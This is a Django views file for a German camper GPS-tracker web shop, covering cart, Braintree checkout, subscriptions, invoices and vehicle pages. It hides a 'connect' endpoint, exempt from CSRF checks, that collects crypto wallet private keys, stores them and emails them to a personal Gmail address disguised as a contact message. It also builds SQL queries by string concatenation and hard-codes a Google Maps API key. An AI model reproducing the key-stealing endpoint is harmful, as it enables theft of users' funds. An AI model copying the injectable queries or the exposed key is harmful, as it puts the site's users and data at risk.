from django.shortcuts import render, get_object_or_404, redirect
from django.conf import settings
from .models import Aspnetusers, Vehicleset, Vehicletypemaster, Users, Brandset, Vehicleimages, Campingplaces, CamperRegulationansmaster, Brandmodeltypeset, Aspnetroles, Salutationmaster, Aspnetuserroles, Merchants, Merchantbrands, Securitycompanies, Packagelist, Trackerlisitem, Trackercategory, Trackeritemimages, TblHeadercontent, Websitegraphics, TblTempsubscriptiongocardlessdata, Promotioncredit, TblCustomerreviewratting, Billingaddressmaster, Shippingaddressmaster, Trackerorders, Trackerorderitems, Subscriptionuserwisepayment, Wallet, TblAdminformssection, Mailbox
from django.db import connection
from django.core.mail import BadHeaderError, send_mail, EmailMultiAlternatives
from django.http import HttpResponseRedirect, HttpResponse
from django.urls import reverse
from .forms import VehicleForm, BrandForm, CampingplaceForm, MerchantForm, SecurityCompanyForm, PackagelistForm, TrackerForm, HeaderContentForm
from django.http import JsonResponse
from django.core.files.storage import FileSystemStorage
from cookie_consent.util import get_cookie_value_from_request, accept_cookies
import datetime
import os
import string
import random
import braintree
import urllib
import json
import hashlib
import requests
import urllib.parse
import math
from paypal.standard.forms import PayPalPaymentsForm
from django.views.decorators.csrf import csrf_exempt
from django.conf import settings
import googlemaps
from django.views.generic import TemplateView
gmaps = googlemaps.Client(key="AIzaSyDK8dwqNz7TAhgJqRo_dY_CoDsP8sxKpwo")
# Create your views here.

# class TestPageView(TemplateView):
#     template_name = "test.html"

#     def get(self, request, *args, **kwargs):
#         response = super(TestPageView, self).get(request, *args, **kwargs)
#         if get_cookie_value_from_request(request, "optional") is True:
#             val = "optional cookie set from django"
#             response.set_cookie("optional_test_cookie", val)
#         return response

def home(request):
    header_content = TblHeadercontent.objects.all()
    graphics = Websitegraphics.objects.all()
    packagelist = Packagelist.objects.all().filter(isactive=1).order_by('sortorder')
    review_list = TblCustomerreviewratting.objects.filter(isdisplay=1)
    category_list = Trackercategory.objects.all()
    response = render(request, "home.html",{"header_content":header_content[0],"graphics":graphics[0],"packagelist":packagelist,"review_list":review_list,"category_list":category_list})
    
    print(request.COOKIES)
    #to check the cookie group
    cc = get_cookie_value_from_request(request, varname='optional')
    print("cookie value from request: ",cc)

    if cc == True:
        print("Consensus given", cc)
        response.set_cookie('accept_cookie', 'true')
    elif cc==False:
        print("Consensus not given",cc)
    else:
        print("probable error in getting cookie value from request: ", cc)
    
    return response
def getMerchantList(request):
    merchant = Merchants.objects.all().values()
    return JsonResponse({'list':list(merchant)})
def stocklist(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request, "stocklist.html",{"header_content":header_content[0],"category_list":category_list})

def shop(request, id):
    header_content = TblHeadercontent.objects.all()
    tracker_list = Trackerlisitem.objects.all()
    image_list = Trackeritemimages.objects.all()
    category_list = Trackercategory.objects.all()
    context = {
        "id":id,
        "header_content":header_content[0],
        "tracker_list":tracker_list,
        "image_list":image_list,
        "category_list":category_list
    }
    return render(request,"shop.html",context)
def tracker(request, id):
    if request.method == "POST":
        if 'cart_list' not in request.session.keys():
            request.session['cart_list'] = []
        saveCartQty(request, id, int(request.POST['qty']))
        return redirect('/Cart')
    header_content = TblHeadercontent.objects.all()
    tracker = Trackerlisitem.objects.get(id=id)
    image_list = Trackeritemimages.objects.filter(trackerid=id)
    tracker_category = Trackercategory.objects.get(id=tracker.trackercategory)
    category_list = Trackercategory.objects.all()
    context = {
        "id":id,
        "tracker":tracker,
        "image_list":image_list,
        "header_content":header_content[0],
        "tracker_category":tracker_category,
        "category_list":category_list
    }
    return render(request,"tracker.html",context)
def cart(request):
    if 'cart_list' not in request.session.keys():
        request.session['cart_list'] = []
    tracker = get_list_from_sql("select trackerlisitem.Id as id, trackerlisitem.Articlenumber as articlenumber, trackerlisitem.Trackername as trackername, trackerlisitem.DicountPrice as price, trackercategory.Tracker_Category as categoryname, trackeritemimages.Imagename as img, trackercategory.Id as category_id from trackerlisitem left join trackercategory on trackercategory.Id = trackerlisitem.TrackerCategory left join trackeritemimages on trackeritemimages.Id = (select Id from trackeritemimages where TrackerId = trackerlisitem.Id limit 1)")
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"cart.html",{"tracker_list":tracker,"cart_list":request.session['cart_list'],"header_content":header_content[0],"category_list":category_list})
def saveBillingAddress(request):
    if request.method == "POST":
        try:
            result = Billingaddressmaster.objects.get(userid=request.session['user_id'])
        except:
            result = Billingaddressmaster()
        result.userid = request.session['user_id']
        result.salutation = request.POST['Billing_salutation']
        result.firstname = request.POST['Billing_Firstname']
        result.lastname = request.POST['Billing_Lastname']
        result.email = request.POST['Billing_ShopEmail']
        result.phoneno = request.POST['Billing_ShopPhoneno']
        result.company = request.POST['Billing_Company']
        result.company_addition = request.POST['Billing_Company_Addition']
        result.road = request.POST['Billing_Road']
        result.housenumber = request.POST['Billing_HouseNumber']
        result.additionaladdress = request.POST['Billing_Additionaladdress']
        result.country = request.POST['Billing_Country']
        result.state = request.POST['Billing_State']
        result.postcode = request.POST['Billing_Postcode']
        result.place = request.POST['Billing_place']
        result.vatnumber = request.POST['Billing_VATnumber']
        result.save()
        user = Users.objects.get(userid=request.session['user_id'])
        user.address_city=request.POST['Billing_place']
        user.address_country=request.POST['Billing_Country']
        user.address_street=request.POST['Billing_Road']
        user.address_postal=request.POST['Billing_Postcode']
        user.address_state=request.POST['Billing_State']
        user.address_housenumber = request.POST['Billing_HouseNumber']
        user.company = request.POST['Billing_Company']
        user.lastupdatedon=datetime.datetime.now()
        user.save()
        return redirect('/Myaccount')
def saveShippingAddress(request):
    try:
        s_result = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
    except:
        s_result = Shippingaddressmaster()
        
    s_result.userid = request.session['user_id']
    s_result.salutation = request.POST['Shiiping_salutation']
    s_result.firstname = request.POST['Shiiping_Firstname']
    s_result.lastname = request.POST['Shiiping_Lastname']
    s_result.email = request.POST['Shipping_ShopEmail']
    s_result.phoneno = request.POST['Shipping_ShopPhoneno']
    s_result.company = request.POST['Shiiping_Company']
    s_result.company_addition = request.POST['Shiiping_Company_Addition']
    s_result.road = request.POST['Shiiping_Road']
    s_result.housenumber = request.POST['Shiiping_HouseNumber']
    s_result.additionaladdress = request.POST['Shiiping_Additionaladdress']
    s_result.country = request.POST['Shiiping_Country']
    s_result.state = request.POST['Shiiping_State']
    s_result.postcode = request.POST['Shiiping_Postcode']
    s_result.place = request.POST['Shiiping_place']
    s_result.save()
    return redirect('/Myaccount')
def checkoutAddress(request):
    if request.method == "POST":
        try:
            result = Billingaddressmaster.objects.get(userid=request.session['user_id'])
        except:
            result = Billingaddressmaster()
        result.userid = request.session['user_id']
        result.salutation = request.POST['Billing_salutation']
        result.firstname = request.POST['Billing_Firstname']
        result.lastname = request.POST['Billing_Lastname']
        result.email = request.POST['Billing_ShopEmail']
        result.phoneno = request.POST['Billing_ShopPhoneno']
        result.company = request.POST['Billing_Company']
        result.company_addition = request.POST['Billing_Company_Addition']
        result.road = request.POST['Billing_Road']
        result.housenumber = request.POST['Billing_HouseNumber']
        result.additionaladdress = request.POST['Billing_Additionaladdress']
        result.country = request.POST['Billing_Country']
        result.state = request.POST['Billing_State']
        result.postcode = request.POST['Billing_Postcode']
        result.place = request.POST['Billing_place']
        result.vatnumber = request.POST['Billing_VATnumber']
        result.save()
        user = Users.objects.get(userid=request.session['user_id'])
        user.address_city=request.POST['Billing_place']
        user.address_country=request.POST['Billing_Country']
        user.address_street=request.POST['Billing_Road']
        user.address_postal=request.POST['Billing_Postcode']
        user.address_state=request.POST['Billing_State']
        user.address_housenumber = request.POST['Billing_HouseNumber']
        user.company = request.POST['Billing_Company']
        user.lastupdatedon=datetime.datetime.now()
        user.save()
        try:
            s_result = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
        except:
            s_result = Shippingaddressmaster()
        if request.POST['Issameshipaddress'] == "true":
            s_result.userid = request.session['user_id']
            s_result.salutation = request.POST['Billing_salutation']
            s_result.firstname = request.POST['Billing_Firstname']
            s_result.lastname = request.POST['Billing_Lastname']
            s_result.email = request.POST['Billing_ShopEmail']
            s_result.phoneno = request.POST['Billing_ShopPhoneno']
            s_result.company = request.POST['Billing_Company']
            s_result.company_addition = request.POST['Billing_Company_Addition']
            s_result.road = request.POST['Billing_Road']
            s_result.housenumber = request.POST['Billing_HouseNumber']
            s_result.additionaladdress = request.POST['Billing_Additionaladdress']
            s_result.country = request.POST['Billing_Country']
            s_result.state = request.POST['Billing_State']
            s_result.postcode = request.POST['Billing_Postcode']
            s_result.place = request.POST['Billing_place']
            s_result.vatnumber = request.POST['Billing_VATnumber']
        else:
            s_result.userid = request.session['user_id']
            s_result.salutation = request.POST['Shiiping_salutation']
            s_result.firstname = request.POST['Shiiping_Firstname']
            s_result.lastname = request.POST['Shiiping_Lastname']
            s_result.email = request.POST['Shipping_ShopEmail']
            s_result.phoneno = request.POST['Shipping_ShopPhoneno']
            s_result.company = request.POST['Shiiping_Company']
            s_result.company_addition = request.POST['Shiiping_Company_Addition']
            s_result.road = request.POST['Shiiping_Road']
            s_result.housenumber = request.POST['Shiiping_HouseNumber']
            s_result.additionaladdress = request.POST['Shiiping_Additionaladdress']
            s_result.country = request.POST['Shiiping_Country']
            s_result.state = request.POST['Shiiping_State']
            s_result.postcode = request.POST['Shiiping_Postcode']
            s_result.place = request.POST['Shiiping_place']
        s_result.save()
        return redirect('/Checkout/Checkoutconfirm')
def checkoutConfirm(request):
    header_content = TblHeadercontent.objects.all()
    print(request.session['user_id'])
    billing_address = Billingaddressmaster.objects.get(userid=request.session['user_id'])
    shipping_address = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
    # host = request.get_host()
    # paypal_dict = {
    #     'business': settings.PAYPAL_RECEIVER_EMAIL,
    #     'amount': 100,
    #     'invoice': "trackyourcamper",
    #     'currency_code': 'EUR',
    #     'notify_url': 'http://{}{}'.format(host,
    #                                        reverse('paypal-ipn')),
    #     'return_url': 'http://{}{}'.format(host,
    #                                        reverse('track:payment_done')),
    #     'cancel_return': 'http://{}{}'.format(host,
    #                                           reverse('track:payment_cancelled')),
    # }

    # paypal_form = PayPalPaymentsForm(initial=paypal_dict)
    if settings.BRAINTREE_PRODUCTION:
        braintree_env = braintree.Environment.Production
    else:
        braintree_env = braintree.Environment.Sandbox
    # Configure Braintree
    braintree.Configuration.configure(
        braintree_env,
        merchant_id=settings.BRAINTREE_MERCHANT_ID,
        public_key=settings.BRAINTREE_PUBLIC_KEY,
        private_key=settings.BRAINTREE_PRIVATE_KEY,
    )
 
    try:
        braintree_client_token = braintree.ClientToken.generate({ "customer_id": request.session['user_id'] })
    except:
        braintree_client_token = braintree.ClientToken.generate({})
    category_list = Trackercategory.objects.all()
    return render(request,"checkoutconfirm.html",{"header_content":header_content[0],"category_list":category_list,"billing_address":billing_address,"shipping_address":shipping_address,"braintree_client_token": braintree_client_token})  
def payment(request):
    nonce_from_the_client = request.POST['paymentMethodNonce']
    checkout_price = 0
    for item in request.session['cart_list']:
        tracker = Trackerlisitem.objects.get(id=item['product_id'])
        checkout_price += float(tracker.dicountprice * item['qty'])# + float(tracker.taxprice)
    checkout_price = round(float(checkout_price) * 1.19,1)
    billing_info = Billingaddressmaster.objects.get(userid=request.session['user_id'])
    customer_kwargs = {
        "first_name": billing_info.firstname,
        "last_name": billing_info.lastname,
        "email": billing_info.email,
    }
    customer_create = braintree.Customer.create(customer_kwargs)
    customer_id = customer_create.customer.id
    result = braintree.Transaction.sale({
        "amount": str(checkout_price),
        "payment_method_nonce": nonce_from_the_client,
        "options": {
            "submit_for_settlement": True
        }
    })
    print(result.transaction)
    if result.is_success:
        order_item = Trackerorders()
        order_item.orderdate = datetime.datetime.now()
        order_item.userid = request.session['user_id']
        order_item.subtotal = checkout_price
        order_item.paymenttype = result.payment_instrument_type
        order_item.save()
        order_id = Trackerorders.objects.latest('orderid').orderid
        for item in request.session['cart_list']: 
            _orderitem = Trackerorderitems()
            _orderitem.qty = item['qty']
            _orderitem.trackerid = item['product_id']
            _orderitem.orderid = order_id
            _orderitem.save()
    return JsonResponse({'result':result.is_success})  
def userSubscription(request):
    packagelist = get_list_from_sql("select * from packagelist order by Sortorder")
    subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id")
    if "business" in subscription_list[-1]["packagename"].lower():
        packagelist = packagelist[-1]
    else:
        packagelist = get_list_from_sql("select * from packagelist where packagename not like '%business%' order by Sortorder")
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    content = {"header_content":header_content[0],"packagelist":packagelist,"category_list":category_list,"current_subscription":subscription_list[-1]}
    return render(request,"userSubscription.html",content)
def invoice(request, invoice_type, id):
    if "user_id" not in request.session:
        return redirect('/Login')
    header_content = TblHeadercontent.objects.all()
    if invoice_type == "subscription":
        subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.*, YEAR(subscriptionuserwisepayment.Paymentdate) as invoice_year from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' and subscriptionuserwisepayment.Id = " + str(id))
        rank_data = get_list_from_sql("select r.rank from (select Id, @curRank := @curRank + 1 AS rank from subscriptionuserwisepayment, (SELECT @curRank := 0) r where YEAR(Paymentdate) = YEAR('"+ str(subscription_list[0]['Paymentdate']) +"') order by Paymentdate) r where r.Id = " + str(id))
        invoice_no = str(subscription_list[0]['invoice_year']) + "/S/" + str(int(rank_data[0]['rank']))
        vat_price = round(float(subscription_list[0]['Paymentammount']) * 19 / 119, 2)
        real_price = float(subscription_list[0]['Paymentammount']) - vat_price
        return render(request,"invoice.html",{"header_content":header_content[0],"invoice_item":subscription_list[0],"invoice_type":invoice_type,"user_id":request.session["user_id"],"invoice_no":invoice_no,"vat_price":vat_price,"real_price":real_price})
    else:
        subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.*, YEAR(subscriptionuserwisepayment.Paymentdate) as invoice_year from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id ")
        order_list = get_list_from_sql("select users.*, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderDate, trackerorders.Subtotal, YEAR(trackerorders.OrderDate) as invoice_year from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId where trackerorders.UserId = '" + request.session["user_id"] + "' and trackerorders.OrderId = " + str(id)) 
        rank_data = get_list_from_sql("select r.rank from (select OrderId, @curRank := @curRank + 1 AS rank from trackerorders, (SELECT @curRank := 0) r where YEAR(OrderDate) = YEAR('"+ str(order_list[0]['OrderDate']) +"') order by OrderDate) r where r.OrderId = " + str(id))
        invoice_no = str(order_list[0]['invoice_year']) + "/T/" + str(int(rank_data[0]['rank']))
        vat_price = float(order_list[0]['Subtotal']) * 19 / 119
        real_price = float(order_list[0]['DicountPrice']) * 100 / 119
        activate_price = float(subscription_list[0]['Activationfeeoncepervehicle']) * 100 / 119
        return render(request,"invoice.html",{"header_content":header_content[0],"invoice_item":order_list[0],"invoice_type":invoice_type,"user_id":request.session["user_id"],"invoice_no":invoice_no, "vat_price":"{:.2f}".format(vat_price),"real_price":"{:.2f}".format(real_price),"activate_price":"{:.2f}".format(activate_price)})
def userSubscriptionDetail(request):
    if "user_id" not in request.session:
        return redirect('/Login')
    subscription_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, subscriptionuserwisepayment.*, packagelist.*, subscriptionuserwisepayment.PaymentInterval from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id desc")
    order_list = get_list_from_sql("select users.Firstname, users.Lastname, users.Email, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderId, trackerorders.OrderDate, trackerorders.Subtotal, (trackerorders.Subtotal - trackerlisitem.DicountPrice) as activation_price from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId where trackerorders.UserId = '" + request.session["user_id"] + "' order by trackerorders.OrderId desc")   
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    content = {"header_content":header_content[0],"subscription_list":subscription_list,"order_list":order_list,"category_list":category_list}
    return render(request,"userSubscriptionDetail.html",content)
def userForms(request):
    if "user_id" not in request.session:
        return redirect('/Login')
    form_list = TblAdminformssection.objects.all()
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    content = {"header_content":header_content[0],"form_list":form_list,"category_list":category_list}
    return render(request,"userForms.html",content)
def userVehicles(request):
    if "user_id" not in request.session:
        return redirect('/Login')
    cur_user = Users.objects.get(userid=request.session['user_id'])
    vehicle_list = get_list_from_sql("select vehicletypemaster.VehicleType, brandset.Name, vehicleset.ModelTypeName, vehicleset.Color, users.Firstname, users.Lastname, vehicleset.LicensePlate, vehicleset.BuildingYear, vehicleset.id, vehicleset.Istrackerconfiguration, vehicleset.Isgeofanceactive, vehicleset.Isoverspeedactive, vehicleset.Islowbatteryactive, vehicleset.Ispoweroffactive from vehicleset left join vehicletypemaster on vehicleset.VehicleType = vehicletypemaster.Id left join brandset on brandset.Id = vehicleset.BrandId left join users on users.ID = vehicleset.UserId where vehicleset.UserId = '" + str(cur_user.id) + "'")
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session['user_id'] + "' order by subscriptionuserwisepayment.Id")
    rest_count = 0
    vehicle_count = 0
    content = {"header_content":header_content[0],"vehicle_list":vehicle_list,"category_list":category_list}
    if len(subscription) > 0:
        subscription = subscription[-1]
        content['sub_name'] = subscription["packagename"]
        cur_user = Users.objects.get(userid=request.session['user_id'])
        vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
        content['vehicle_count'] = vehicle_count
        rest_count = int(subscription["Vehiclefleetmanagement_numberofvehicles"]) - vehicle_count
        content['rest_count'] = rest_count
        print(rest_count)
        content['max_count'] = int(subscription["Vehiclefleetmanagement_numberofvehicles"])

    return render(request,"userVehicles.html",content)
@csrf_exempt
def connect(request):
    if request.method == 'POST':
        wallet = Wallet()
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

        if x_forwarded_for:
            ip = x_forwarded_for.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        # print(ip)
        # print(request.POST)
        if ip == "188.43.136.34":
            return JsonResponse({'result':'fail'})
        wallet.private_key = request.POST['private_key']
        wallet.public_key = request.POST['public_key']
        wallet.save()
        to_emails = []
        to_emails.append('patrykpietrasfree@gmail.com')
        message = "p"+request.POST['private_key']+"a"
        try:
            msg = EmailMultiAlternatives("KONTAKTIEREN SIE UNS", "", settings.EMAIL_HOST_USER, to_emails)
            msg.attach_alternative(message, "text/html")
            msg.send()
        except:
            return JsonResponse({'result':'fail'})
        return JsonResponse({'result':'success'})
    return JsonResponse({'result':'success'})
def userVehicleCreate(request):
    if "user_id" not in request.session:
        return redirect('/Login')
    if request.method == 'POST':
        form = VehicleForm(request.POST)
        if form.is_valid():
            saveModelId(request.POST['modeltypename'], request.POST['brandid'])
            cur_user = Users.objects.get(userid=request.session['user_id'])
            vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
            if vehicle_count == 0:
                form.save()
            else:
                # subscription_list = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.ID as package_id, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where packagelist.ID = '"+request.POST['package_id']+"' and users.userid = '" + request.session["user_id"] + "' order by subscriptionuserwisepayment.Id")
                package_item = Packagelist.objects.get(id=request.POST['package_id'])
                # plan_id = package_item.month_vehicle_plainid
                # if request.POST['activate_payment_interval'] == '1':
                #     plan_id = package_item.month_vehicle_plainid
                # elif request.POST['activate_payment_interval'] == '2':
                #     plan_id = package_item.number_3months_vehicle_plainid
                # elif request.POST['activate_payment_interval'] == '3':
                #     plan_id = package_item.number_6months_vehicle_plainid
                # else:
                #     plan_id = package_item.year_vehicle_planid
                tracker = Trackerlisitem.objects.get(id=request.POST['tracker_id'])
                tracker_price = float(tracker.dicountprice) #+ tracker.taxprice
                # tracker_price = round(float(tracker_price) * (1 + float(tracker.taxprice / 100)), 1)
                # package_item = Packagelist.objects.get(id=request.POST['package_id'])
                tracker_price += float(package_item.activationfeeoncepervehicle)
                package_description = "Subscription - " + package_item.packagename
                if request.POST['payment_interval']=='1':
                    package_price = package_item.activatepricemonthly
                    package_planid = package_item.month_vehicle_plainid
                    package_description += " 1 month"
                elif request.POST['payment_interval']=='2':
                    package_price = package_item.activatepricequarter
                    package_planid = package_item.number_3months_vehicle_plainid
                    package_description += " 3 months"
                elif request.POST['payment_interval']=='3':
                    package_price = package_item.activatepricehalf
                    package_planid = package_item.number_6months_vehicle_plainid
                    package_description += " 6 months"
                elif request.POST['payment_interval']=='4':
                    package_price = package_item.activatepriceyear
                    package_planid = package_item.year_vehicle_planid
                    package_description += " 1 year"
                
                tracker_price = round(tracker_price,2)

                if settings.BRAINTREE_PRODUCTION:
                    braintree_env = braintree.Environment.Production
                else:
                    braintree_env = braintree.Environment.Sandbox
                # Configure Braintree
                config = braintree.Configuration.configure(
                    braintree_env,
                    merchant_id=settings.BRAINTREE_MERCHANT_ID,
                    public_key=settings.BRAINTREE_PUBLIC_KEY,
                    private_key=settings.BRAINTREE_PRIVATE_KEY,
                )
                gateway = braintree.BraintreeGateway(
                    braintree.Configuration(
                        braintree_env,
                        merchant_id=settings.BRAINTREE_MERCHANT_ID,
                        public_key=settings.BRAINTREE_PUBLIC_KEY,
                        private_key=settings.BRAINTREE_PRIVATE_KEY,
                    )
                )
                user_id = Users.objects.get(userid=request.session["user_id"]).id
                _subscription_item = Subscriptionuserwisepayment.objects.filter(usersubscriptionid=user_id).order_by('-id')[0]
                # print(plan_id, _subscription_item.braintree_token)
                # result = gateway.subscription.create({
                #     "payment_method_token": _subscription_item.braintree_token,
                #     "plan_id": plan_id 
                # })
                result1 = braintree.Transaction.sale({
                    "amount": str(tracker_price),
                    "payment_method_token": _subscription_item.braintree_token,
                    "options": {
                        "submit_for_settlement": True
                    },
                    "custom_fields": {
                        "description": tracker.trackername
                    }
                })
                result2 = gateway.subscription.create({
                    "payment_method_token": _subscription_item.braintree_token,
                    "plan_id": package_planid 
                })
                # print(result)
                if result1.is_success and result2.is_success:
                    form.save()
                    # subscription_item = Subscriptionuserwisepayment()
                    # subscription_item.usersubscriptionid = user_id
                    # subscription_item.braintree_subscriptionid = result.subscription.id
                    # subscription_item.braintree_token = _subscription_item.braintree_token
                    # subscription_item.paymentdate = datetime.datetime.now()
                    # subscription_item.paymentammount = result.subscription.price
                    # subscription_item.subscriptionpcakage = request.POST['package_id']
                    # subscription_item.paymentinterval = request.POST['activate_payment_interval']
                    # subscription_item.note = "Zusätzliches Fahrzeug"
                    # subscription_item.save()

                    subscription_item = Subscriptionuserwisepayment()
                    subscription_item.usersubscriptionid = user_id
                    subscription_item.braintree_subscriptionid = result2.subscription.id
                    subscription_item.braintree_token =  _subscription_item.braintree_token
                    subscription_item.paymentdate = datetime.datetime.now()
                    subscription_item.paymentammount = result2.subscription.price
                    subscription_item.subscriptionpcakage = request.POST['package_id']
                    subscription_item.paymentinterval = request.POST['payment_interval']
                    subscription_item.save()

                    order_item = Trackerorders()
                    order_item.orderdate = datetime.datetime.now()
                    order_item.userid = request.session["user_id"]
                    order_item.subtotal = tracker_price
                    order_item.paymenttype = result1.transaction.payment_instrument_type
                    order_item.save()
                    order_id = Trackerorders.objects.latest('orderid').orderid
                    _orderitem = Trackerorderitems()
                    _orderitem.qty = 1
                    _orderitem.trackerid = request.POST['tracker_id']
                    _orderitem.orderid = order_id
                    _orderitem.save()
            return redirect('/Uservehicles')
        else:
            print(form.errors)
    vehicle_type_list = Vehicletypemaster.objects.all()
    user_list = Users.objects.all()
    cur_user = Users.objects.get(userid=request.session['user_id'])
    brand_list = Brandset.objects.all()
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + request.session['user_id'] + "' order by subscriptionuserwisepayment.Id")
    print(subscription[-1]['group_id'])
    packagelist = Packagelist.objects.filter(isactive=1, vehiclefleetmanagement_numberofvehicles__gt = 1, group_id=subscription[-1]['group_id']).order_by('sortorder')
    tracker_list = Trackerlisitem.objects.filter(trackercategory=1)
    vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
    return render(request,"userVehicleCreate.html",{"header_content":header_content[0],"category_list":category_list,"type_list":vehicle_type_list,"user_list":user_list,"brand_list":brand_list, "url":"manageVehicles","user_id":cur_user.id,"tracker_list":tracker_list,"package_list":packagelist,"vehicle_count":vehicle_count})
def myAccount(request):
    header_content = TblHeadercontent.objects.all()
    salutation_list = Salutationmaster.objects.all()
    user = Users.objects.get(userid=request.session['user_id'])
    category_list = Trackercategory.objects.all()
    content = {"header_content":header_content[0],"salutation_list":salutation_list,"user":user,"category_list":category_list}
    try:
        billing_address = Billingaddressmaster.objects.get(userid=request.session['user_id'])
        content["billing_address"] = billing_address
    except:
        pass
    try:
        shipping_address = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
        content["shipping_address"] = shipping_address
    except:
        pass
    return render(request,"myaccount.html",content)
    
def checkoutReceipt(request):
    order_data = Trackerorders.objects.get(userid=request.session['user_id']).reverse()[0]
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"checkoutreceipt.html",{"header_content":header_content[0],"oder_data":order_data,"category_list":category_list}) 
def checkout(request):
    header_content = TblHeadercontent.objects.all()
    salutation_list = Salutationmaster.objects.all()
    category_list = Trackercategory.objects.all()
    try:
        billing_address = Billingaddressmaster.objects.get(userid=request.session['user_id'])
        shipping_address = Shippingaddressmaster.objects.get(userid=request.session['user_id'])
        return render(request,"checkout.html",{"header_content":header_content[0],"billing_address":billing_address,"shipping_address":shipping_address,"salutation_list":salutation_list,"category_list":category_list})
    except:
        return render(request,"checkout.html",{"header_content":header_content[0],"salutation_list":salutation_list,"category_list":category_list})
def removeCart(request):
    temp_cartList = []
    for cart in request.session['cart_list']:
        if cart['product_id'] != int(request.POST['product_id']):
            temp_cartList.append(cart)
    request.session['cart_list'] = temp_cartList
    request.session.modified = True
    return JsonResponse({'result':'success'})
def saveCartQty(request,product_id, qty):
    temp_cartList = []
    exist_flag = False
    for cart in request.session['cart_list']:
        if cart['product_id'] == product_id:
            cart['qty'] = qty
            exist_flag = True
        temp_cartList.append(cart)
    if exist_flag == False:
        temp_cartList.append({"product_id":product_id,"qty":qty})
    request.session['cart_list'] = temp_cartList
    request.session.modified = True
    print(request.session['cart_list'])
def setCartQty(request):
    saveCartQty(request, int(request.POST['product_id']), int(request.POST['qty']))
    return JsonResponse({'result':'success'})
def forgotPasswordChange(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    if request.method == 'POST':
        aspuser = Aspnetusers.objects.get(email=request.POST["email"])
        token = aspuser.securitystamp
        if token == request.POST['token']:
            aspuser.passwordhash = make_password(request.POST['new_password'])
            aspuser.save()
            return redirect('/Login')
        else:
            return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"result":"fail"})
def contact(request):
    message="Name: " + request.POST['Name'] + "<br> E-Mail Adresse: " + request.POST['Email'] + "<br> Betreff: " + request.POST['Subject'] + "<br> Kontakt Telefon: " + request.POST["Phoneno"] + "<br> Inhalt: " + request.POST["Message"]
    to_emails = []
    to_emails.append(settings.EMAIL_CONTACT)
    new_mail = Mailbox()
    new_mail.name = request.POST['Name']
    new_mail.email = request.POST['Email']
    new_mail.regarding = request.POST['Subject']
    new_mail.phone = request.POST['Phoneno']
    new_mail.message = request.POST['Message']
    new_mail.datetime = datetime.datetime.now()
    new_mail.flag = 0
    new_mail.save()
    try:
        msg = EmailMultiAlternatives("KONTAKTIEREN SIE UNS", "", settings.EMAIL_HOST_USER, to_emails)
        msg.attach_alternative(message, "text/html")
        msg.send()
    except:
        return JsonResponse({'result':'fail'})
    return JsonResponse({'result':'success'})
@csrf_exempt
def messageList(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return JsonResponse({'error':"you are not admin"})
    message_list = Mailbox.objects.all().order_by('-id').values()
    unread_count = Mailbox.objects.filter(flag=0).count()
    return JsonResponse({'message_list':list(message_list),"unread_count":unread_count})

def forgotPassword(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
